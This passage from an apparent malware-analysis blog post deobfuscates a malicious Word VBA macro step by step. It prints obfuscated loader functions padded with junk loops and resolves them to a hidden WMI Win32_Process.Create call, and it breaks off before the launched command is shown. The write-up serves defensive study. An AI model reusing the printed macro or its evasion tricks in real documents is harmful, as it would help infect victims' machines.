Bgcfzyxxfdxh = CLng(Wriwwmyrie)
Next
If er &gt; Uwrwalpbpt Then
gggs = Sin(3)
Rvvsucwkyojuq = Bwjxxmpd
Iclrlucmm = CByte(8 - CSng(3))
End If

............ stripped (216) lines ............</code></pre>
<details>
<summary>Expand the full code of <code>Awzttocpmk</code> function</summary>
<pre><code>2.
Function Awzttocpmk()
dv = "in=mmuusns==mmuusns==mmuusns=mgm=mmuusns==mmuusns==mmuusns=t" + ChrW(wdKeyS) + ":=mmuusns==mmuusns=win=mmuusns==mmuusns=32=mmuusns==mmuusns=_" + Dtcqcidgf.Ekrdfjzpyjnsx + "r=mmuusns==mmuusns=oc=mmuusns==mmuusns==mmuusns=ess=mmuusns==mmuusns="
    For Bekkjavx = rgfasd To Qforoylvscd
          ewr = dsf - CVar(er * 23)
                      Mdwqzgbq = CSng(Pagurlxflyza)
            Bgcfzyxxfdxh = CLng(Wriwwmyrie)
            Next
      If er &gt; Uwrwalpbpt Then
          gggs = Sin(3)
                      Rvvsucwkyojuq = Bwjxxmpd
            Iclrlucmm = CByte(8 - CSng(3))
End If
      If sdf &gt; Qgxfhjlg Then
          wer3 = Sin(1)
                      Gyhoefvgjbrum = Ksmtghdx
            Qmspddxoib = CByte(234 - CSng(3))
End If
For Dhohgcej = rgfasd To Mfxqzmgpdafd
          ewr = dsf - CDbl(er * 23)
                      Cqgxugdjvgpf = CSng(Bbssovansmekh)
            Dyzsvepvgopqc = CLng(Auhhnchmott)
            Next
fd = "=mmuusns="
    For Fvucxrbdv = rgfasd To Uqkgtvihq
          ewr = dsf - CVar(er * 23)
                      Cfhbnbovrjcby = CSng(Xbqwcrgwip)
            Gfvovqgtpuvda = CLng(Vwrolikxhrtnh)
            Next
      If er &gt; Zmmeiqwvg Then
          gggs = Sin(3)
                      Ftcfmworkaqa = Whowbdzxgvj
            Fjzbkdtcqubfx = CByte(8 - CSng(3))
End If
      If sdf &gt; Liimwplihyf Then
          wer3 = Sin(1)
                      Imhwuzihkyfw = Fmnqeeklym
            Guarcfvbuene = CByte(234 - CSng(3))
End If
For Qhajdqadgvuia = rgfasd To Wnuaatogt
          ewr = dsf - CDbl(er * 23)
                      Avrbyifgocloj = CSng(Dnfwuertyqte)
            Bbhndpfme = CLng(Cupgkyktgp)
            Next
Azofmlab = Split("=mmuusns==mmuusns==mmuusns==mmuusns==mmuusns=w" + dv + T, fd)
    For Ykkyqqckszh = rgfasd To Filpjgycxaon
          ewr = dsf - CVar(er * 23)
                      Opdrenhfsiab = CSng(Yrghyaqlgy)
            Unbjwkrvouoh = CLng(Lapdoiepdftg)
            Next
      If er &gt; Fdjfqjsudjlqj Then
          gggs = Sin(3)
                      Ddzeeopvcjsq = Vppuspkljr
            Rwgryzxu = CByte(8 - CSng(3))
End If
      If sdf &gt; Ucljpihw Then
          wer3 = Sin(1)
                      Mkhtwwqqksth = Xtolltsl
            Umjjacemtbog = CByte(234 - CSng(3))
End If
For Ucigkhimsj = rgfasd To Tvkdabaoyjmhq
          ewr = dsf - CDbl(er * 23)
                      Goinrecqjll = CSng(Liuaxeji)
            Anfanlpaqcs = CLng(Jvtsrebsoaxdq)
            Next
Dlgwrtobrxjmm = Join(Azofmlab, "")
    For Jxwpetpsjt = rgfasd To Rtmdajsyfgb
          ewr = dsf - CVar(er * 23)
                      Qppckogvvy = CSng(Pylldflb)
            Xgnsotlddvod = CLng(Apzfxvwv)
            Next
      If er &gt; Klhmbaqh Then
          gggs = Sin(3)
                      Riprankrumplk = Ofgeeuccmi
            Yccegrolrz = CByte(8 - CSng(3))
End If
      If sdf &gt; Jkearkzbz Then
          wer3 = Sin(1)
                      Ujchepfcjxa = Rhitvwuoxbu
            Bkcjbmxohve = CByte(234 - CSng(3))
End If
For Vlxzhjzpjj = rgfasd To Fdgzxihoo
          ewr = dsf - CDbl(er * 23)
                      Azwoobkmekkb = CSng(Yuluasbaevj)
            Kmwvwhqwzlu = CLng(Zxxvubyiynv)
            Next
Set Fcbxktofsye = GetObject(Dlgwrtobrxjmm)
    For Wkthmcuz = rgfasd To Ouwshhhyqksi
          ewr = dsf - CVar(er * 23)
                      Wjuaylqcfdn = CSng(Ikkfxtpygk)
            Cozfojopfkdht = CLng(Blpsfrwy)
            Next
      If er &gt; Fuofoqyad Then
          gggs = Sin(3)
                      Rwruyaexgcmwt = Rsogfpkzio
            Rufhqfcjpx = CByte(8 - CSng(3))
End If
      If sdf &gt; Qsahdsyvr Then
          wer3 = Sin(1)
                      Flwqhgxifyrnc = Vrqextuipnpc
            Qespvzvtovd = CByte(234 - CSng(3))
End If
For Shzexhixgen = rgfasd To Lchcsdcsp
          ewr = dsf - CDbl(er * 23)
                      Xhazccvbfecap = CSng(Vmsjzflqosl)
            Zpwcnahq = CLng(Uejlybjbrt)
            Next
Rpkdwysvusev = Dtcqcidgf.Fshewmvxnlq.Tag
Ixldqggmg = Dlgwrtobrxjmm + ChrW(wdKeyS) + Dtcqcidgf.Hsinculclm.Tag + Rpkdwysvusev
    For Kfwvcraz = rgfasd To Vwqgwymmhpx
          ewr = dsf - CVar(er * 23)
                      Hgvulaykhidq = CSng(Mnexsobqg)
            Kchomccm = CLng(Ogxozydonmq)
            Next
      If er &gt; Aydreiqrartb Then
          gggs = Sin(3)
                      Wugadgqyghi = Ycsrkhkhpik
            Wxnpdnbh = CByte(8 - CSng(3))
End If
      If sdf &gt; Hlnwbcswilss Then
          wer3 = Sin(1)
                      Aitnjglwd = Tkrdvrjqil
            Lifxmbmmeigov = CByte(234 - CSng(3))
End If
For Xahlionisat = rgfasd To Ibgvvlieejzu
          ewr = dsf - CDbl(er * 23)
                      Eldciaclqa = CSng(Ixanxtnsddbkt)
            Ktriqsbixo = CLng(Nqxlguyckd)
            Next
Ybdakolbjc = Ixldqggmg + Dtcqcidgf.Ekrdfjzpyjnsx
    For Fgealfhi = rgfasd To Eyoxzsavk
          ewr = dsf - CVar(er * 23)
                      Taljfnjpcbd = CSng(Ehxnfhdi)
            Vmbkrkkar = CLng(Mftrgsxtqeb)
            Next
      If er &gt; Srumqdjfss Then
          gggs = Sin(3)
                      Dcsfsbldosbew = Goldugprapx
            Ghtndtcpfny = CByte(8 - CSng(3))
End If
      If sdf &gt; Cxapqqrodqh Then
          wer3 = Sin(1)
                      Qnlspurxwgyob = Zaamzfesrkygs
            Qmyhdpem = CByte(234 - CSng(3))
End If
For Mrfqbapo = rgfasd To Cquprmuthrn
          ewr = dsf - CDbl(er * 23)
                      Tplpuzguncjnn = CSng(Pjjswkaa)
            Qqulfgpmsl = CLng(Luopvonkbdn)
            Next
Set Awzttocpmk = GetObject(Ybdakolbjc)
    For Ruqbuxxdchv = rgfasd To Edlajgene
          ewr = dsf - CVar(er * 23)
                      Mfzbtjevsj = CSng(Zeeutsxyf)
            Mbycrpudnhg = CLng(Yvjtcayyoxm)
            Next
      If er &gt; Mkuhoeson Then
          gggs = Sin(3)
                      Hnfyfdzsppwx = Wfvtxdlf
            Jifscwal = CByte(8 - CSng(3))
End If
      If sdf &gt; Mpuzskythpp Then
          wer3 = Sin(1)
                      Drzwvpwjba = Xxgqspkcurh
            Anfsyxnxwcbda = CByte(234 - CSng(3))
End If
For Zekoskvnsdoae = rgfasd To Ljoaubqqccor
          ewr = dsf - CDbl(er * 23)
                      Emskodpgtrlf = CSng(Pkximfqrozk)
            Ohldtvsnq = CLng(Qhceqwopbdb)
            Next
Awzttocpmk. _
showwindow = False
    For Cgrjopyakkgj = rgfasd To Wonvluwmw
          ewr = dsf - CVar(er * 23)
                      Svafwthrhpl = CSng(Spdpdyuipbwks)
            Cvpkjsvtx = CLng(Rysgtlurdvq)
            Next
      If er &gt; Xnidududdc Then
          gggs = Sin(3)
                      Zbkcwvfuoh = Ihlpamklogn
            Sztalowduu = CByte(8 - CSng(3))
End If
      If sdf &gt; Ogzlmuqrsv Then
          wer3 = Sin(1)
                      Fcrrdxsnnsev = Dsymonbfmfka
            Xfrwnbviwf = CByte(234 - CSng(3))
End If
For Bwwvcdzsrxsgg = rgfasd To Zqmhcwgqibh
          ewr = dsf - CDbl(er * 23)
                      Yuwtmsmfjq = CSng(Biuamkqol)
            Kxwzvfnuuvpu = CLng(Ztomlpzi)
            Next
Do While Fcbxktofsye. _
Create(er &amp; Ysjchbkkg, Swdtudgkjzjs, Awzttocpmk, Dzzebvtpbu)
Loop
    For Onobifnwx = rgfasd To Njsvmeei
          ewr = dsf - CVar(er * 23)
                      Bnkueublgzl = CSng(Kiuiqprkny)
            Bcbpfffqrnae = CLng(Klkqisex)
            Next
      If er &gt; Swosxdoovc Then
          gggs = Sin(3)
                      Avbufstwipam = Awpwnduox
            Nsnzlieaslo = CByte(8 - CSng(3))
End If
      If sdf &gt; Nmdlecvcnsd Then
          wer3 = Sin(1)
                      Ypzxmysdsafxw = Mmulhbjbzjkun
            Akhmjpav = CByte(234 - CSng(3))
End If
For Wkvlynhvzpa = rgfasd To Kxpozncefqrz
          ewr = dsf - CDbl(er * 23)
                      Kxglrvvkrop = CSng(Cznxzdrwptabi)
            Rudmcxxxse = CLng(Xagbzxrz)
            Next
End Function</code></pre>
</details>
<p>As seen in the codes, there are hundreds of loops, declarations, conditions, type conversions and variable assignments to obfuscate codes, and many of them are never used. Since, <code>olevba</code> could not deobfuscate the macro codes, we try <code> <a href="https://github.com/decalage2/ViperMonkey" target="_blank" rel="noopener"> ViperMonkey </a> </code> for deobfuscation.</p>
<blockquote>
<div style="font-size: 1.5em;"><span>💡</span></div>
<div style="width: 100%;"><a href="https://github.com/decalage2/ViperMonkey" target="_blank" rel="noopener"> ViperMonkey </a> is a VBA Emulation engine written in Python, designed to analyze and deobfuscate malicious VBA Macros contained in Microsoft Office files.</div>
</blockquote>
<pre><code>............ stripped ............
ERROR    Impossible to operate on arguments of different types. invalid literal for int() with base 10: ''
INFO     calling Function: CDbl(0)
ERROR    Impossible to operate on arguments of different types. invalid literal for int() with base 10: 'NULL'
WARNING  Variable 'Cznxzdrwptabi' not found
INFO     calling Function: CSng('NULL')
WARNING  Variable 'Xagbzxrz' not found
INFO     calling Function: CLng('NULL')
ERROR    Cannot update loop counter. Breaking loop. invalid literal for int() with base 10: 'NULL'
............ stripped ............</code></pre>
<p>ViperMonkey doesn’t deobfuscate macro codes either, so it's time now for the manual analysis. When we clear macro codes by removing never used loops, declarations, conditions, type conversions and variables, we reveal the following code from hundreds of lines of code.</p>
<pre><code>3.
Function Awzttocpmk()
dv = "in=mmuusns==mmuusns==mmuusns=mgm=mmuusns==mmuusns==mmuusns=t" + ChrW(wdKeyS) + ":=mmuusns==mmuusns=win=mmuusns==mmuusns=32=mmuusns==mmuusns=_" + Dtcqcidgf.Ekrdfjzpyjnsx + "r=mmuusns==mmuusns=oc=mmuusns==mmuusns==mmuusns=ess=mmuusns==mmuusns="
fd = "=mmuusns="
Azofmlab = Split("=mmuusns==mmuusns==mmuusns==mmuusns==mmuusns=w" + dv + T, fd)
Dlgwrtobrxjmm = Join(Azofmlab, "")
Set Fcbxktofsye = GetObject(Dlgwrtobrxjmm)
Rpkdwysvusev = Dtcqcidgf.Fshewmvxnlq.Tag
Ixldqggmg = Dlgwrtobrxjmm + ChrW(wdKeyS) + Dtcqcidgf.Hsinculclm.Tag + Rpkdwysvusev
Ybdakolbjc = Ixldqggmg + Dtcqcidgf.Ekrdfjzpyjnsx
Set Awzttocpmk = GetObject(Ybdakolbjc)
Awzttocpmk. showwindow = False
Do While Fcbxktofsye. Create(er &amp; Ysjchbkkg, Swdtudgkjzjs, Awzttocpmk, Dzzebvtpbu)
Loop
End Function</code></pre>
<p>Other than declarations and variable assignments, there is only one meaningful loop in this function:</p>
<pre><code>4. Do While <strong>Fcbxktofsye</strong>.Create(<strong>er</strong> &amp; <strong>Ysjchbkkg</strong>, <strong>Swdtudgkjzjs</strong>, <strong>Awzttocpmk</strong>, <strong>Dzzebvtpbu</strong>)
Loop</code></pre>
<p>First, we need to find <code>Fcbxktofsye</code> in the <code>Awzttocpmk()</code> function <em>:</em></p>
<pre><code>5. Set <strong>Fcbxktofsye</strong> = GetObject(<strong>Dlgwrtobrxjmm</strong>)</code></pre>
<p>So, we need to find <code>Dlgwrtobrxjmm</code> in the function:</p>
<pre><code>6. <strong>Dlgwrtobrxjmm</strong> = Join(<strong>Azofmlab</strong>, "")</code></pre>
<p>When we put <mark>6.</mark> in place of <code>Dlgwrtobrxjmm</code> in <mark>5.</mark> , we get:</p>
<pre><code>7. Set <strong>Fcbxktofsye</strong> = GetObject(Join(<strong>Azofmlab</strong>, ""))</code></pre>
<p>Now, we need to find <code>Azofmlab</code> to find <code>Fcbxktofsye</code> <em>.</em> <code>Azofmlab</code> is defined in the macro codes:</p>
<pre><code>8. <strong>Azofmlab</strong> = Split("=mmuusns==mmuusns==mmuusns==mmuusns==mmuusns=w" + <strong>dv</strong> + <strong>T</strong>, <strong>fd</strong>)</code></pre>
<p>When we put <mark>8.</mark> in place of <code>Azofmlab</code> in <mark>7.</mark> , we get:</p>
<pre><code>9. Set <strong>Fcbxktofsye</strong> = GetObject(Join(Split("=mmuusns==mmuusns==mmuusns==mmuusns==mmuusns=w" + <strong>dv</strong> + <strong>T</strong>, <strong>fd</strong>), ""))</code></pre>
<p>So, we must find <code>dv</code> <em>,</em> <code>T</code> and <code>fd</code> variables.</p>
<p><code>dv</code> is defined in the macro codes:</p>
<pre><code>10. <strong>dv</strong> = "in=mmuusns==mmuusns==mmuusns=mgm=mmuusns==mmuusns==mmuusns=t" + <strong>ChrW(wdKeyS)</strong> + ":=mmuusns==mmuusns=win=mmuusns==mmuusns=32=mmuusns==mmuusns=_" + <strong>Dtcqcidgf.Ekrdfjzpyjnsx </strong>+ "r=mmuusns==mmuusns=oc=mmuusns==mmuusns==mmuusns=ess=mmuusns==mmuusns="</code></pre>
<p>Now, we need to find the value of the <code>ChrW(wdKeyS)</code> function and <code>Dtcqcidgf.Ekrdfjzpyjnsx</code> to reveal <code>dv</code> .</p>
<blockquote>
<div style="font-size: 1.5em;"><span>💡</span></div>
<div style="width: 100%;">wdKeyS is an example of <a href="https://docs.microsoft.com/en-us/office/vba/api/word.wdkey" target="_blank" rel="noopener"> wdKey enumeration </a> in Word, which specifies a keyboard character.</div>
</blockquote>
<p>According to <a href="https://docs.microsoft.com/en-us/office/vba/api/word.wdkey" target="_blank" rel="noopener"> wdKey enumeration </a> , <code>wdKeyS</code> is 83 <strong>.</strong></p>
<pre><code>11. <strong>ChrW(wdKeyS)</strong> = <strong>ChrW(83)</strong></code></pre>
<blockquote>
<div style="font-size: 1.5em;"><span>💡</span></div>
<div style="width: 100%;"><a href="https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/chr-function" target="_blank" rel="noopener"> ChrW(CharCode) </a> converts CharCode long integer to string.</div>
</blockquote>
<p>According to ASCII code, 83 specifies the <code>S</code> character, so <code>ChrW(83)</code> is equal to the <code>S</code> character.</p>
<pre><code>12. <strong>ChrW(wdKeyS)</strong> = "S"</code></pre>
<p>So, <code>ChrW(wdKeyS)</code> is equal to the <code>S</code> character, but adversaries used this function instead of a simple "S" in order to obfuscate their codes to decrease the detection rate.</p>
<p>Let's find the second unknown variable of dv, which is <code>Dtcqcidgf.Ekrdfjzpyjnsx</code> <em>.</em> But, it does not exist in the macro codes <em>.</em> Because, adversaries hid <code>Dtcqcidgf.Ekrdfjzpyjnsx</code> in VBA forms in the document other than macro codes for obfuscation. It is obvious why automated tools cannot deobfuscate the macro code.</p>
<p><code>olevba</code> revealed the form variable <code>Dtcqcidgf.Ekrdfjzpyjnsx</code> :</p>
<pre><code>VBA FORM Variable "Ekrdfjzpyjnsx" IN 'ST_28546448.doc' - OLE stream: u'Macros/Dtcqcidgf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
P</code></pre>
<p>So, the value of the form variable <code>Dtcqcidgf.Ekrdfjzpyjnsx</code> is <code>P</code> .</p>
<pre><code>13. <strong>Dtcqcidgf.Ekrdfjzpyjnsx</strong> = "P"</code></pre>
<p>Let's put <mark>12.</mark> and <mark>13</mark> . in their places in 9 <mark>.</mark> :</p>
<pre><code>14. <strong>dv</strong> = "in=mmuusns==mmuusns==mmuusns=mgm=mmuusns==mmuusns==mmuusns=t" + "S" + ":=mmuusns==mmuusns=win=mmuusns==mmuusns=32=mmuusns==mmuusns=_" + "P" + "r=mmuusns==mmuusns=oc=mmuusns==mmuusns==mmuusns=ess=mmuusns==mmuusns="</code></pre>
<blockquote>
<div style="font-size: 1.5em;"><span>💡</span></div>
<div style="width: 100%;"><code>+</code> operator in VBA adds two numbers or returns the positive value of a numeric expression. It can also be used to <a href="https://docs.microsoft.com/en-us/dotnet/visual-basic/language-reference/operators/addition-operator" target="_blank" rel="noopener"> concatenate </a> two string expressions.</div>
</blockquote>
<p>So, we can concatenate substrings in <code>dv</code> :</p>
<pre><code>15. <strong>dv</strong> = "in=mmuusns==mmuusns==mmuusns=mgm=mmuusns==mmuusns==mmuusns=tS:=mmuusns==mmuusns=win=mmuusns==mmuusns=32=mmuusns==mmuusns=_Pr=mmuusns==mmuusns=oc=mmuusns==mmuusns==mmuusns=ess=mmuusns==mmuusns="</code></pre>
<p>We found <code>dv</code> . Now, it is time to find <code>T</code> and <code>fd</code> <em>t</em> o reveal <code>Fcbxktofsye</code> .</p>
<p><code>T</code> is not initialized in codes. Microsoft Visual Basic Editors' Locals Window shows its value as Empty.</p>
<figure><img style="width: 1260px;" src="https://www.picussecurity.com/hubfs/Imported_Blog_Media/img2.png" alt="Image" title="Image"></figure>
<pre><code>16. <strong>T</strong> = ""</code></pre>
<p><code>fd</code> is defined in the macro codes:</p>
<pre><code>17. <strong>fd</strong> = "=mmuusns="</code></pre>
<p>Let's put <mark>15.</mark> , <mark>16.</mark> and <mark>17.</mark> in their places in <mark>10.</mark> :</p>
<pre><code>18. Set <strong>Fcbxktofsye</strong> = GetObject(Join(Split("=mmuusns==mmuusns==mmuusns==mmuusns==mmuusns=w" + "in=mmuusns==mmuusns==mmuusns=mgm=mmuusns==mmuusns==mmuusns=tS:=mmuusns==mmuusns=win=mmuusns==mmuusns=32=mmuusns==mmuusns=_Pr=mmuusns==mmuusns=oc=mmuusns==mmuusns==mmuusns=ess=mmuusns==mmuusns=" + "", "=mmuusns="), ""))</code></pre>
<p>Get rid of "+":</p>
<pre><code>19. Set <strong>Fcbxktofsye</strong> = GetObject(Join(Split("=mmuusns==mmuusns==mmuusns==mmuusns==mmuusns=win=mmuusns==mmuusns==mmuusns=mgm=mmuusns==mmuusns==mmuusns=tS:=mmuusns==mmuusns=win=mmuusns==mmuusns=32=mmuusns==mmuusns=_Pr=mmuusns==mmuusns=oc=mmuusns==mmuusns==mmuusns=ess=mmuusns==mmuusns=", "=mmuusns="), ""))</code></pre>
<p>Now, first we must find the result of the <code>Split</code> function.</p>
<blockquote>
<div style="font-size: 1.5em;"><span>💡</span></div>
<div style="width: 100%;">The <a href="https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/split-function" target="_blank" rel="noopener"> Split </a> function is used is to split a string into a number of substrings based on the given delimiter and returns a one-dimensional array of substrings.</div>
</blockquote>
<p>We can find the result of the <code>Split</code> function by splitting the text with the delimiter <code>=mmuusns=</code> by simply removing all instances of the delimiter in the string:</p>
<pre><code>20. ("win","mgm","tS:","win","32","_Pr","oc","ess")</code></pre>
<p>Let's put the result in its place in <mark>15.</mark> :</p>
<pre><code>21. Set <strong>Fcbxktofsye</strong> = GetObject(Join(("win","mgm","tS:","win","32","_Pr","oc","ess"), ""))</code></pre>
<p>Now, we need to find the result of the <code>Join</code> function.</p>
<blockquote>
<div style="font-size: 1.5em;"><span>💡</span></div>
<div style="width: 100%;">The <a href="https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/join-function" target="_blank" rel="noopener"> Join </a> function joins an array of substrings into a single string.</div>
</blockquote>
<p>So, the result of the <code>Join</code> function is ( <code><em>Dlgwrtobrxjmm = Join(Azofmlab, "")</em></code> )</p>
<pre><code>22. <strong>Dlgwrtobrxjmm</strong><em> = "</em>winmgmtS:win32_Process"</code></pre>
<p>Now, we can reveal the <code>Fcbxktofsye</code> <em>:</em></p>
<pre><code>23. Set <strong>Fcbxktofsye</strong> = GetObject(winmgmtS:win32_Process)</code></pre>
<p>Finally, we get a hint of what this code does:</p>
<blockquote>
<div style="font-size: 1.5em;"><span>💡</span></div>
<div style="width: 100%;">The <a href="https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-process" target="_blank" rel="noopener"> <strong>Win32_Process</strong> </a> <a href="https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-process" target="_blank" rel="noopener"></a> is a <strong>WMI</strong> class representing a process on an operating system.</div>
</blockquote>
<p>Therefore, attackers will run a process using <strong>WMI</strong> ( <code>Windows Management Instrumentation,</code> <code> <a href="https://attack.mitre.org/techniques/T1047/" target="_blank" rel="noopener"> MITRE ATT&amp;CK T1047 </a> </code> ) instead of <strong>cmd</strong> ( <code>Command-Line Interface,</code> <a href="https://attack.mitre.org/techniques/T1059/" target="_blank" rel="noopener"> <code>MITRE ATT&amp;CK T1059</code> </a> ).</p>
<blockquote>
<div style="font-size: 1.5em;"><span>💡</span></div>
<div style="width: 100%;"><a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page" target="_blank" rel="noopener"> Windows Management Instrumentation (WMI) </a> is the infrastructure for management data and operations on Windows-based operating systems. You can write WMI scripts or applications to automate administrative tasks on remote computers but WMI also supplies management data to other parts of the operating system and products.</div>
</blockquote>
<p>Let's put <mark>23.</mark> into <mark>4.</mark> :</p>
<pre><code>24. Do While GetObject(winmgmtS:win32_Process).Create(<strong>er</strong> &amp; <strong>Ysjchbkkg</strong>, <strong>Swdtudgkjzjs</strong>, <strong>Awzttocpmk</strong>, <strong>Dzzebvtpbu</strong>) Loop</code></pre>
<p>Now, we must find <code>er</code> , <code>Ysjchbkkg</code> <em>,</em> <code>Swdtudgkjzjs</code> <em>,</em> <code>Awzttocpmk</code> and <code>Dzzebvtpbu</code> variables.</p>
<p><code>er</code> variable is not initialized, it is NULL.</p>
<figure><img style="width: 1268px;" src="https://www.picussecurity.com/hubfs/Imported_Blog_Media/img3.png" alt="Image" title="Image"></figure>
<pre><code>25. <strong>er</strong> = ""</code></pre>
<p><code>Ysjchbkkg</code> is stored in another function. There are also never used loops, declarations, conditions, type conversions and variable assignments to obfuscate codes.</p>
<pre><code>26.
Function Ysjchbkkg()
    For Nagspgiy = rgfasd To Eqsbwirkrwf
          ewr = dsf - CVar(er * 23)
                      Cafxunqrqgmm = CSng(Tuonppje)
            Lbrjnfryxgerk = CLng(Kivokgoxfxp)
            Next
      If er &gt; Qzkxtglswh Then
          gggs = Sin(3)
                      Pnosxcjgze = Pxswdllxchh
            Gxdwuobrdusaf = CByte(8 - CSng(3))
End If
      If sdf &gt; Fwjltwiwoppk Then
          wer3 = Sin(1)

............ stripped (323 lines) ............</code></pre>
<details>
<summary>Expand the full code of <code>Ysjchbkkg</code> function.</summary>
<pre><code>26.
Function Ysjchbkkg()
    For Nagspgiy = rgfasd To Eqsbwirkrwf
          ewr = dsf - CVar(er * 23)
                      Cafxunqrqgmm = CSng(Tuonppje)
            Lbrjnfryxgerk = CLng(Kivokgoxfxp)
            Next
      If er &gt; Qzkxtglswh Then
          gggs = Sin(3)
                      Pnosxcjgze = Pxswdllxchh
            Gxdwuobrdusaf = CByte(8 - CSng(3))
End If
      If sdf &gt; Fwjltwiwoppk Then
          wer3 = Sin(1)
                      Ihfqwregj = Fwmczwydqsf
            Ezybphfeflvnm = CByte(234 - CSng(3))
End If
For Qqznfvnzvu = rgfasd To Rgfockjlwtdq
          ewr = dsf - CDbl(er * 23)
                      Lalronmonzsss = CSng(Zdgzpoyzwsdc)
            Xnimfkmodf = CLng(Csgvkrjtx)
            Next
Jqzbdljbr = I + ChrW(wdKeyP)
    For Czoegypdqv = rgfasd To Voclotzgntxuy
          ewr = dsf - CVar(er * 23)
                      Uavnminf = CSng(Lttuisatgwerz)
            Hnxjcuftxvd = CLng(Lrijumczf)
            Next
      If er &gt; Axasqwdap Then
          gggs = Sin(3)
                      Vpvfefawz = Sipnuwmepbbsi
            Ndasdfkfvsno = CByte(8 - CSng(3))
End If
      If sdf &gt; Yjmzcerdccgnl Then
          wer3 = Sin(1)
                      Twmaksxv = Sidtvghe
            Sosfackaymp = CByte(234 - CSng(3))
End If
For Bcwbnxeb = rgfasd To Ykwokhvyi
          ewr = dsf - CDbl(er * 23)
                      Mfdhaiixxumy = CSng(Ryfuhdpd)
            Vdoascnhpjpx = CLng(Noweqkmlqmti)
            Next
Lbfipxywqppc = Jqzbdljbr + Dtcqcidgf.Iqjssfeeu + Dtcqcidgf.Zxioomrqvjz
    For Wdpztkrubhtb = rgfasd To Glywqmcig
          ewr = dsf - CVar(er * 23)
                      Nflgijeu = CSng(Biizgcdzu)
            Tocmawysqox = CLng(Gffosyohbbfcq)
            Next
      If er &gt; Jyjlrjtrjt Then
          gggs = Sin(3)
                      Gbprdaktbx = Wbkrmwjka
            Rfmqomowuk = CByte(8 - CSng(3))
End If
      If sdf &gt; Fljcbfcim Then
          wer3 = Sin(1)
                      Ppzcemjx = Symrkvhmavv
            Efduiexhwicx = CByte(234 - CSng(3))
End If
For Kkjknzqmnxk = rgfasd To Vvlngewuwa
          ewr = dsf - CDbl(er * 23)
                      Tojwqjuj = CSng(Crkikcssfjqub)
            Uwsetnjrjt = CLng(Qwoqicysu)
            Next
sss = Dtcqcidgf.Xrqtcysa.GroupName
Fbxpzsewrc = Split(Lbfipxywqppc + CVar(Trim(sss)), "=mmuusns=")
    For Xuoefdntvn = rgfasd To Nryjsvnnf
          ewr = dsf - CVar(er * 23)
                      Oljrnvdantlb = CSng(Kxdwkarxygf)
            Yghnhozasvma = CLng(Ndkbpjuiyjru)
            Next
      If er &gt; Rndlkaet Then
          gggs = Sin(3)
                      Enpprbqwm = Uneqtaqh
            Mgvifsapxntxe = CByte(8 - CSng(3))
End If
      If sdf &gt; Teqxtvha Then
          wer3 = Sin(1)
                      Zyvranmikrgug = Qgoukwihn
            Ajeaefwlgueyx = CByte(234 - CSng(3))
End If
For Pugvzxdpc = rgfasd To Foaqrirdncdk
          ewr = dsf - CDbl(er * 23)
                      Xvfnlhqv = CSng(Oasaywucl)
            Hlpcwhtm = CLng(Ktubcxbrhc)
            Next
Ysjchbkkg = Join(Fbxpzsewrc, "")
    For Chxepiwrcoy = rgfasd To Gtrbjtbf
          ewr = dsf - CVar(er * 23)
                      Wwmmkduoffan = CSng(Nululwsldkurb)
            Tblkmahcvlnh = CLng(Zctkuoohhuvd)
            Next
      If er &gt; Cstbhtmepdwv Then
          gggs = Sin(3)
                      Pixorsehaggz = Uqpiopzcsl
            Gunqnziwr = CByte(8 - CSng(3))
End If
      If sdf &gt; Hltnvrmuioaky Then
          wer3 = Sin(1)
                      Gpsnqlnklkt = Hqjtvtixvbek
            Rsfkpczstee = CByte(234 - CSng(3))
End If
For Tahdcgtnse = rgfasd To Efqlnnckuwr
          ewr = dsf - CDbl(er * 23)
                      Eitpxepmipwoy = CSng(Meznyvkx)
            Fqcyqwibd = CLng(Axvascvptxply)
            Next
End Function</code></pre>
</details>
<p>When we clear useless codes that are included in the macro codes to cover malicious code, we reveal the following function:</p>
<pre><code>27.
Function Ysjchbkkg()
Jqzbdljbr = I + ChrW(wdKeyP)
Lbfipxywqppc = Jqzbdljbr + Dtcqcidgf.Iqjssfeeu + Dtcqcidgf.Zxioomrqvjz
sss = Dtcqcidgf.Xrqtcysa.GroupName
Fbxpzsewrc = Split(Lbfipxywqppc + CVar(Trim(sss)), "=mmuusns=")
Ysjchbkkg = Join(Fbxpzsewrc, "")
End Function</code></pre>
<p>From the <code>Ysjchbkkg</code> function:</p>
<pre><code>28. <strong>Ysjchbkkg</strong> = Join(<strong>Fbxpzsewrc</strong>, "")</code></pre>
<p><code>Fbxpzsewrc</code> is also defined in the function:</p>
<pre><code>29. <strong>Fbxpzsewrc</strong> = Split(<strong>Lbfipxywqppc</strong> + CVar(Trim(<strong>sss</strong>)), "=mmuusns=")</code></pre>
<p>Put <mark>29</mark> . in <mark>28.</mark> :</p>
<pre><code>30. <strong>Ysjchbkkg</strong> = Join(Split(<strong>Lbfipxywqppc</strong> + CVar(Trim(<strong>sss</strong>)), "=mmuusns="), "")</code></pre>
<p>We must find <code>Lbfipxywqppc</code> and <code>sss</code> to reveal <code>Ysjchbkkg</code> . They are included in the <code>Ysjchbkkg</code> function:</p>
<pre><code>31. <strong>Lbfipxywqppc</strong> = <strong>Jqzbdljbr</strong> + <strong>Dtcqcidgf.Iqjssfeeu</strong> + <strong>Dtcqcidgf.Zxioomrqvjz</strong></code></pre>
<pre><code>32. <strong>sss</strong> = <strong>Dtcqcidgf.Xrqtcysa</strong>.<strong>GroupName</strong></code></pre>
<p>Put <mark>31</mark> . and <mark>32.</mark> in <mark>30.</mark> :</p>
<pre><code>33. <strong>Ysjchbkkg</strong> = Join(Split(<strong>Jqzbdljbr</strong> + <strong>Dtcqcidgf.Iqjssfeeu</strong> + <strong>Dtcqcidgf.Zxioomrqvjz</strong> + CVar(Trim(<strong>Dtcqcidgf.Xrqtcysa</strong>.<strong>GroupName</strong>)), "=mmuusns="), "")</code></pre>
<p>Now, we need to find <code>Jqzbdljbr</code> <em>,</em> <code>Dtcqcidgf.Iqjssfeeu</code> <em>,</em> <code>Dtcqcidgf.Zxioomrqvjz</code> and <code>CVar(Trim(Dtcqcidgf.Xrqtcysa.GroupName)</code> .</p>
<p><!--more--></p>
<p><code>Jqzbdljbr</code> exist in the function:</p>
